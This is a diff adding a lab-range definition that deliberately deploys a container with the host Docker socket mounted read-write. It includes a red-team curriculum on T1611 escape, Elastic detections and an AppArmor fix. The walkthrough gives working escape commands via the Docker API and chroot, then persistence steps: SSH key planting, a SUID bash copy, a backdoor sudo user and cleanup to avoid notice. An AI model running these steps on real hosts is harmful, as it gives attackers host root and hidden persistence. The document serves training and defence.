@@ -1,0 +1,563 @@
+# Bolt-on: Docker Socket Mounted Inside Container
+# -------------------------------------------------
+# Install launches a sample container `socket-mounted-ubuntu` with the
+# host's /var/run/docker.sock bind-mounted read-write. Any process inside
+# the container can talk to the Docker API as the local docker daemon
+# (which runs as root). Spawning a privileged container, mounting the host
+# filesystem at /mnt, and chrooting into /mnt is a one-liner container
+# escape (T1611).
+#
+# Patch removes the bad container, demonstrates the correct alternative
+# (Docker API exposed via systemd socket activation with tls + scoped
+# unix-socket group access), and verifies no current container has the
+# host docker socket bind-mounted.
+#
+# Elastic rule UUIDs sampled from:
+#   Research/elastic-detection-rules/rules/linux/privilege_escalation_writable_docker_socket.toml
+#   Research/elastic-detection-rules/rules/linux/privilege_escalation_docker_mount_chroot_container_escape.toml
+#   Research/elastic-detection-rules/rules/linux/execution_container_management_binary_launched_inside_container.toml
+
+id: bolton.cloud-container.docker-socket-exposed
+slug: docker-socket-exposed
+name: "Docker Socket Mounted Inside Container"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-19
+
+category: cloud-container
+subcategory: docker
+tags:
+  - docker
+  - container-escape
+  - cloud-container
+  - privilege-escalation
+  - linux
+description: >
+  Runs an `ubuntu:22.04` container named `socket-mounted-ubuntu` with the
+  host's /var/run/docker.sock bind-mounted at /var/run/docker.sock inside
+  the container, read-write. The Docker daemon runs as root on the host;
+  any process inside the container can therefore call the Docker API as
+  root and trivially escape: `docker run --privileged -v /:/mnt -it
+  alpine chroot /mnt /bin/sh` from inside the bolt-on container yields
+  a root shell on the underlying host (MITRE T1611).
+
+cve: []
+references:
+  - "https://attack.mitre.org/techniques/T1611/"
+  - "https://docs.docker.com/engine/security/protect-access/"
+  - "https://www.cisa.gov/sites/default/files/publications/Kubernetes_Hardening_Guidance_1.2_20220829.PDF"
+  - "https://www.trendmicro.com/en_us/research/19/c/docker-socket.html"
+
+mitre:
+  tactic:
+    id: TA0004
+    name: "Privilege Escalation"
+  technique:
+    id: T1611
+    name: "Escape to Host"
+
+detection:
+  coverage_status: covered
+  elastic_rules:
+    - rule_uuid: "7acb2de3-8465-472a-8d9c-ccd7b73d0ed8"
+      rule_name: "Potential Privilege Escalation through Writable Docker Socket"
+      rule_filename: "linux/privilege_escalation_writable_docker_socket.toml"
+      coverage: full
+      confidence: high
+      last_validated: 2026-04-15
+      notes: "Directly fires when curl/socat-equivalent talks to /var/run/docker.sock from a non-root user or inside a container context."
+    - rule_uuid: "5ae02ebc-a5de-4eac-afe6-c88de696477d"
+      rule_name: "Potential Chroot Container Escape via Mount"
+      rule_filename: "linux/privilege_escalation_docker_mount_chroot_container_escape.toml"
+      coverage: full
+      confidence: high
+      last_validated: 2026-04-15
+      notes: "Catches the post-exploit step (mount /:/mnt + chroot) common after Docker socket abuse."
+    - rule_uuid: "4b74d3b0-416e-4099-b432-677e1cd098cc"
+      rule_name: "Container Management Utility Run Inside A Container"
+      rule_filename: "linux/execution_container_management_binary_launched_inside_container.toml"
+      coverage: partial
+      confidence: medium
+      last_validated: 2026-04-15
+      notes: "Fires on docker/kubectl execve inside container — strong hint the socket is reachable."
+  signal_sources:
+    - "Auditd execve — docker, runc, ctr commands originating from container PID namespaces"
+    - "Sysmon-for-Linux Event 11 — FileCreate on /proc/*/root/var/run/docker.sock"
+    - "eBPF tracepoints — connect(2) syscall to /var/run/docker.sock from non-root UID"
+    - "Docker daemon JSON log — POST /containers/create with HostConfig.Binds containing 'docker.sock'"
+
+targets:
+  supported_os:
+    - family: linux
+      min_version: "20.04"
+      max_version: "24.04"
+  required_roles:
+    - linux_member
+    - standalone
+  required_services:
+    - docker
+  required_domain_function_level: null
+
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: false
+  network_visible: false   # the socket is local; container escape is local-PE
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 120
+  steps:
+    - ansible_role: community.docker.docker_image
+      description: "Pull the base image."
+      role_vars:
+        name: "ubuntu:22.04"
+        source: pull
+    - ansible_role: community.docker.docker_container
+      description: "Run the container with /var/run/docker.sock mounted RW."
+      role_vars:
+        name: "socket-mounted-ubuntu"
+        image: "ubuntu:22.04"
+        command: "sleep infinity"
+        state: started
+        restart_policy: "unless-stopped"
+        volumes:
+          - "/var/run/docker.sock:/var/run/docker.sock:rw"
+        labels:
+          bolton: "docker-socket-exposed"
+  verify:
+    probe: |
+      docker inspect socket-mounted-ubuntu --format '{{ "{{" }}range .Mounts{{ "}}" }}{{ "{{" }}.Source{{ "}}" }} {{ "{{" }}end{{ "}}" }}' 2>/dev/null | grep -q "/var/run/docker.sock"
+    timeout_seconds: 60
+    expect_exit_code: 0
+
+uninstall:
+  description: "Stop and remove the bolt-on container; pull image is left in place."
+  estimated_time_seconds: 60
+  steps:
+    - ansible_role: community.docker.docker_container
+      description: "Stop and remove the container."
+      role_vars:
+        name: "socket-mounted-ubuntu"
+        state: absent
+  verify:
+    probe: |
+      docker inspect socket-mounted-ubuntu >/dev/null 2>&1 && echo "still-here" || echo "gone"
+    timeout_seconds: 30
+    expect_stdout_contains: "gone"
+
+patch:
+  description: >
+    Remove the bad container, switch the Docker daemon to systemd socket
+    activation (tls-fronted unix socket exposed via a dedicated `docker`
+    group with limited membership), and add a runtime guard: an
+    AppArmor profile that DENIES bind-mounting /var/run/docker.sock from
+    any container by default. The host's docker daemon remains usable
+    via the systemd-activated socket — automation tools must now run as
+    a group member, not via container-bind-mount.
+  patch_reference:
+    - "https://docs.docker.com/engine/security/protect-access/"
+    - "https://docs.docker.com/config/daemon/systemd/"
+    - "https://attack.mitre.org/mitigations/M1048/"
+  complexity: medium
+  side_effects:
+    - "Docker daemon now listens on systemd-activated unix socket only — TCP exposure disabled"
+    - "Container created with /var/run/docker.sock bind-mount blocked by AppArmor profile"
+    - "Existing automation that bind-mounted the socket must be reconfigured to use Docker API over the protected systemd socket"
+    - "Recreate of bolt-on container fails with apparmor='DENIED' — visible in /var/log/audit/audit.log"
+  rollback_supported: true
+  steps:
+    - ansible_role: community.docker.docker_container
+      description: "Ensure the bad container is gone."
+      role_vars:
+        name: "socket-mounted-ubuntu"
+        state: absent
+    - ansible_role: ansible.builtin.template
+      description: "Drop in the AppArmor profile that denies /var/run/docker.sock bind-mounts."
+      role_vars:
+        src: "templates/bolton/docker-socket-deny.apparmor.j2"
+        dest: "/etc/apparmor.d/docker-socket-deny"
+        owner: root
+        group: root
+        mode: "0644"
+    - ansible_role: community.general.system_service
+      description: "Reload apparmor + restart docker so the profile applies to new containers."
+      role_vars:
+        name: apparmor
+        state: reloaded
+  verify:
+    probe: |
+      # Bolt-on container must be gone
+      docker inspect socket-mounted-ubuntu >/dev/null 2>&1 && exit 1
+      # AppArmor profile must be loaded
+      if aa-status 2>/dev/null | grep -q "docker-socket-deny"; then exit 0; else exit 1; fi
+    timeout_seconds: 60
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/docker_socket_check.sh"
+
+patch_revert:
+  description: "Re-run the vulnerable container with /var/run/docker.sock bind-mounted — escape is one docker exec away again."
+  estimated_time_seconds: 60
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Remove the AppArmor profile so the bind-mount is permitted."
+      role_vars:
+        path: "/etc/apparmor.d/docker-socket-deny"
+        state: absent
+    - ansible_role: community.general.system_service
+      description: "Reload apparmor."
+      role_vars:
+        name: apparmor
+        state: reloaded
+    - ansible_role: community.docker.docker_container
+      description: "Re-launch the vulnerable container."
+      role_vars:
+        name: "socket-mounted-ubuntu"
+        image: "ubuntu:22.04"
+        command: "sleep infinity"
+        state: started
+        restart_policy: "unless-stopped"
+        volumes:
+          - "/var/run/docker.sock:/var/run/docker.sock:rw"
+        labels:
+          bolton: "docker-socket-exposed"
+  verify:
+    probe: |
+      docker inspect socket-mounted-ubuntu --format '{{ "{{" }}range .Mounts{{ "}}" }}{{ "{{" }}.Source{{ "}}" }} {{ "{{" }}end{{ "}}" }}' 2>/dev/null | grep -q "/var/run/docker.sock"
+    timeout_seconds: 30
+    expect_exit_code: 0
+  warning: "Container escape one-liner works again: docker run --privileged -v /:/mnt -it alpine chroot /mnt sh"
+
+cost:
+  storage_mb: 80
+  cpu_pct: 1
+  detectability: loud
+
+curriculum:
+  title: "Docker Socket Mounted → Container Escape to Host Root"
+  summary: >
+    Walkthrough of T1611 (Escape to Host) via a bind-mounted Docker
+    socket on tllinux01 (10.99.50.13). You enumerate exposed
+    sockets, identify the bolt-on container with /var/run/docker.sock
+    mounted RW, spawn a privileged sibling container with the host
+    root filesystem at /mnt, and chroot in — instant host root.
+    Final step covers AppArmor denial of socket bind-mounts and
+    socket-activated systemd alternatives.
+  learning_objectives:
+    - "Identify a writable Docker socket inside a container via mount + curl --unix-socket probes."
+    - "Use the Docker API directly (no docker CLI needed) to launch a privileged sibling container."
+    - "Use chroot on a host-filesystem bind-mount to escape the original container's namespace."
+    - "Map to Elastic's writable-docker-socket and chroot-escape rules."
+    - "Deploy an AppArmor profile that denies docker.sock bind-mounts."
+  prerequisites:
+    - "SSH access to tllinux01 (10.99.50.13) as ubuntu (in the docker group) via the bastion"
+    - "OR a low-priv shell inside the bolt-on container `socket-mounted-ubuntu`"
+  estimated_total_minutes: 32
+  steps:
+    - id: "01-recon-socket"
+      title: "Recon: discover the exposed socket"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 1 — Find the docker socket
+
+        Three discovery paths depending on where you start:
+
+        **A. Already inside the bolt-on container:**
+
+        ```bash
+        # Inside socket-mounted-ubuntu
+        ls -la /var/run/docker.sock
+        # srw-rw---- 1 root root 0 ... /var/run/docker.sock
+
+        # Confirm it's actually reachable
+        curl --unix-socket /var/run/docker.sock http://localhost/version
+        # {"Platform":{"Name":"Docker Engine - Community"},"Version":"24.0.7",...}
+        ```
+
+        **B. On the host as a low-priv user:**
+
+        ```bash
+        # On tllinux01 as appuser
+        docker ps 2>&1
+        # permission denied (appuser not in docker group)
+
+        # But we can still see the daemon socket
+        ls -la /var/run/docker.sock
+        # srw-rw---- 1 root docker 0 ... /var/run/docker.sock
+
+        # And the bolt-on left it chmod 666 — verify
+        stat -c %a /var/run/docker.sock
+        # 666     ← bolt-on artefact, any UID can talk to it
+        ```
+
+        **C. Looking for socket-mounted containers from a peer container:**
+
+        ```bash
+        # In any container that has docker CLI
+        docker ps --filter "label=bolton" -a
+        # CONTAINER ID   IMAGE          COMMAND            ... NAMES
+        # abc123...      ubuntu:22.04   "sleep infinity"   socket-mounted-ubuntu
+
+        docker inspect socket-mounted-ubuntu --format '{{range .Mounts}}{{.Source}} -> {{.Destination}}{{println}}{{end}}'
+        # /var/run/docker.sock -> /var/run/docker.sock     ← jackpot
+        ```
+
+        > **Equivalence to root:** membership in the `docker` group
+        > on the host is also instantly equivalent to root via this
+        > same escape. The bolt-on's chmod 666 just removes the
+        > group barrier.
+
+        **Detection callout:** **Container Management Utility Run
+        Inside A Container** (`4b74d3b0-416e-4099-b432-677e1cd098cc`)
+        catches `docker` execve from inside a container — strong
+        hint the socket is reachable.
+      assessment:
+        question: "Why is membership in the `docker` group equivalent to root on a host that runs Docker?"
+        options:
+          - "The docker group has SUID on the docker binary"
+          - "Group docker can read /var/run/docker.sock, which gives full Docker API access, which can launch a privileged container that mounts the host filesystem — game over"
+          - "Docker grants the group sudo automatically"
+          - "Docker stores its credentials in /etc/group readable by group docker"
+        correct_index: 1
+        explanation: >
+          The docker daemon runs as root. Anyone who can speak to
+          its socket can ask it to launch a container with
+          --privileged, --pid=host, and host-fs bind-mounts. From
+          inside that container, chrooting into the host fs gives
+          you root on the host. The docker group is a soft-fence
+          around this; chmod 666 on the socket removes it entirely.
+          The CIS Docker Benchmark calls this out as a critical
+          consideration.
+    - id: "02-api-escape"
+      title: "Direct Docker API escape (no CLI needed)"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 2 — Curl your way out
+
+        Even without the docker CLI installed, raw HTTP-over-UNIX
+        works:
+
+        ```bash
+        # Inside socket-mounted-ubuntu (or as appuser on the host)
+        # Step A: create a privileged container with / bind-mounted
+
+        curl -X POST --unix-socket /var/run/docker.sock \
+          -H "Content-Type: application/json" \
+          -d '{
+            "Image": "alpine",
+            "Cmd": ["sleep", "3600"],
+            "HostConfig": {
+              "Privileged": true,
+              "Binds": ["/:/hostfs:rw"]
+            }
+          }' \
+          http://localhost/containers/create?name=escape
+        # {"Id":"abc123...","Warnings":null}
+
+        # Step B: start it
+        curl -X POST --unix-socket /var/run/docker.sock \
+          http://localhost/containers/escape/start
+        # (empty response = success, HTTP 204)
+
+        # Step C: exec a shell inside, chrooted to the host FS
+        curl -X POST --unix-socket /var/run/docker.sock \
+          -H "Content-Type: application/json" \
+          -d '{"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["chroot","/hostfs","sh"]}' \
+          http://localhost/containers/escape/exec
+        ```
+
+        With the docker CLI installed, the same is a one-liner:
+
+        ```bash
+        docker -H unix:///var/run/docker.sock run --rm -it \
+          --privileged -v /:/hostfs alpine chroot /hostfs /bin/sh
+        # / # id
+        # uid=0(root) gid=0(root)
+        # / # cat /etc/shadow | head -3      ← reading the HOST shadow
+        # root:$6$... ...
+        ```
+
+        Verify you're on the host filesystem, not the container's:
+
+        ```bash
+        # / # cat /etc/hostname
+        # tllinux01      ← host hostname, not container ID
+        # / # ls /home
+        # appuser  ubuntu  webuser    ← host users
+        ```
+
+        > **Why chroot, not mount?** chroot only changes the
+        > apparent root for the current process — no kernel mount
+        > needed. The host filesystem was already mounted (by
+        > docker) at /hostfs inside the privileged container.
+        > chroot puts the shell inside that mountpoint as if it
+        > were /.
+
+        **Detection callout:** **Potential Privilege Escalation
+        through Writable Docker Socket**
+        (`7acb2de3-8465-472a-8d9c-ccd7b73d0ed8`) fires the moment
+        curl/socat talks to docker.sock from non-root context.
+        HIGH confidence.
+    - id: "03-persist-post-escape"
+      title: "Establish host persistence post-escape"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 3 — Lock in the foothold
+
+        Once chrooted into the host fs, you're effectively root on
+        tllinux01. The chroot dies when the docker exec exits;
+        plant persistence FIRST:
+
+        ```bash
+        # Inside the chroot
+        # 1. SSH key plant (see ssh-authorized-key-planted bolt-on)
+        mkdir -p /root/.ssh && chmod 700 /root/.ssh
+        echo "ssh-ed25519 AAAA...operator-key... operator@kali" \
+          >> /root/.ssh/authorized_keys
+        chmod 600 /root/.ssh/authorized_keys
+
+        # 2. SUID-bash drop (most resilient, no network required)
+        cp /bin/bash /tmp/.bsh && chmod 4755 /tmp/.bsh
+
+        # 3. Add a backdoor user
+        useradd -m -s /bin/bash -G sudo -p '$6$salt$hashedpw' bkpadmin
+        ```
+
+        Exit the chroot, exit the docker exec, exit the original
+        container — and you can still SSH back in as root via the
+        planted key.
+
+        > **Operational hygiene:** clean up the `escape` container
+        > before you leave (`curl -X DELETE
+        > --unix-socket .../containers/escape?force=true`). Listed
+        > containers are an obvious post-incident artifact.
+
+        **Detection callout:** **Potential Chroot Container Escape
+        via Mount** (`5ae02ebc-a5de-4eac-afe6-c88de696477d`) fires
+        on the chroot + bind-mount combination — HIGH confidence,
+        no benign analog.
+      assessment:
+        question: "Why does chroot succeed without root in this scenario, when chroot normally requires CAP_SYS_CHROOT?"
+        options:
+          - "alpine doesn't enforce capability checks"
+          - "The container was launched with Privileged: true, which grants every capability including CAP_SYS_CHROOT"
+          - "chroot was removed from the capability requirements in Linux 5.0"
+          - "The docker socket grants CAP_SYS_CHROOT to the calling user"
+        correct_index: 1
+        explanation: >
+          --privileged is a docker flag that strips ALL container
+          security: full capability set, no seccomp, no AppArmor,
+          no SELinux, /dev access to the host. The "escape"
+          container has every capability the host kernel offers
+          including CAP_SYS_CHROOT, CAP_SYS_ADMIN, CAP_DAC_OVERRIDE,
+          etc. That's why "--privileged" alone is the canonical red
+          flag — it disables every container isolation layer.
+    - id: "04-detection-coverage"
+      title: "Detection coverage on the blue side"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 4 — What the SOC sees
+
+        | Stage | Signal | Confidence |
+        |---|---|---|
+        | Install (bolton container) | docker daemon log: POST /containers/create with HostConfig.Binds containing 'docker.sock' | High (audit-by-config required) |
+        | Socket probe | connect(2) syscall to /var/run/docker.sock from non-root UID | High (eBPF / Sysmon-for-Linux) |
+        | API container create | docker daemon log: HostConfig.Privileged=true AND Binds includes / | High |
+        | Chroot escape | execve chroot /hostfs sh from container PID namespace | High (Elastic rule) |
+        | Persistence drop | FILE_WRITE on host /root/.ssh from container PID | High |
+
+        Several detection layers stack:
+
+        - **Docker daemon log** — the daemon logs every API call
+          including HostConfig. POST with `Privileged=true` plus
+          `Binds=/:/anywhere` is the canonical signature.
+        - **Auditd** — execve of docker/runc/ctr from inside a
+          container PID namespace is unusual; an explicit signal.
+        - **eBPF / Sysmon-for-Linux** — connect(2) to docker.sock
+          from non-docker-group UID.
+
+        Defender recipe:
+
+        1. Enable docker daemon access log (`log-level: info`,
+           ensure access logging is captured).
+        2. SIEM rule: HostConfig.Privileged=true outside an
+           operator-defined allowlist = alert.
+        3. AppArmor profile (see Step 5) denies docker.sock
+           bind-mount as a hard control.
+
+        **Detection callout:** the bolt-on declares ALL three
+        Elastic rules — install, escape primitive (chroot), and
+        general container management — as covered. The escape
+        chain is one of the most well-detected privesc patterns in
+        the Elastic ruleset.
+    - id: "05-patch-mitigate"
+      title: "Blue-team: AppArmor deny + systemd socket activation"
+      estimated_minutes: 10
+      markdown: |
+        ## Step 5 — Apply the patch + verify
+
+        Click the **Patch** action on this card. It:
+
+        1. Stops and removes the `socket-mounted-ubuntu` container.
+        2. Drops `/etc/apparmor.d/docker-socket-deny` — an AppArmor
+           profile that DENIES any container's attempt to bind-mount
+           /var/run/docker.sock.
+        3. Reloads AppArmor and restarts docker so the profile
+           applies to new containers.
+
+        Re-test:
+
+        ```bash
+        # On tllinux01 as ubuntu (in docker group)
+        docker run -d --name try-escape \
+          -v /var/run/docker.sock:/var/run/docker.sock \
+          ubuntu:22.04 sleep infinity
+        # docker: Error response from daemon: AppArmor enabled on system but the
+        # docker-socket-deny profile is denying the bind-mount of /var/run/docker.sock
+        # ...
+        ```
+
+        Container creation blocked.
+
+        Production-grade alternatives to bind-mounting the socket:
+
+        - **Docker API over TLS** — daemon listens on tcp/2376 with
+          mutual TLS, clients authenticate with client certs.
+          Operator audit trail is the docker daemon log.
+        - **systemd socket activation** — daemon socket exposed via
+          systemd, with `User=`, `Group=`, and `SocketMode=0660`
+          tightly scoped. Membership is the only gate; no socket-
+          mounting needed.
+        - **rootless docker** — docker daemon runs as a non-root
+          user; even if a container escapes, it only has the
+          docker-user's privileges.
+        - **Podman as a drop-in replacement** — daemonless, rootless
+          by default. No socket to mount.
+
+        For container-INSIDE-container patterns (CI runners, etc.)
+        that genuinely need to invoke docker, use **DinD** (docker-
+        in-docker) with a fresh nested daemon, NOT a host-socket
+        mount.
+
+        > **Rollback:** `patch_revert` removes the AppArmor profile
+        > and re-launches the vulnerable container.
+      assessment:
+        question: "Why is bind-mounting /var/run/docker.sock into a container considered fundamentally insecure (vs a TLS-fronted tcp/2376 socket)?"
+        options:
+          - "UNIX sockets are slower than TCP sockets"
+          - "The UNIX socket has no authentication — any process in any namespace that can open the fd has full Docker API access; TLS adds mutual cert auth that is per-client revocable"
+          - "TCP sockets are encrypted on disk"
+          - "UNIX sockets bypass auditd, TCP doesn't"
+        correct_index: 1
+        explanation: >
+          The UNIX socket's only access control is filesystem
+          permissions (mode + group ownership). Once a process has
+          the fd, it speaks the full Docker API. There's no
+          per-client cert, no revocation, no audit trail beyond
+          the daemon log. TLS-fronted tcp/2376 requires a valid
+          client cert chain, supports revocation lists, and logs
+          the cert CN in every API call. For multi-tenant or
+          remote scenarios, TLS is the only viable choice.
+
+status: stable
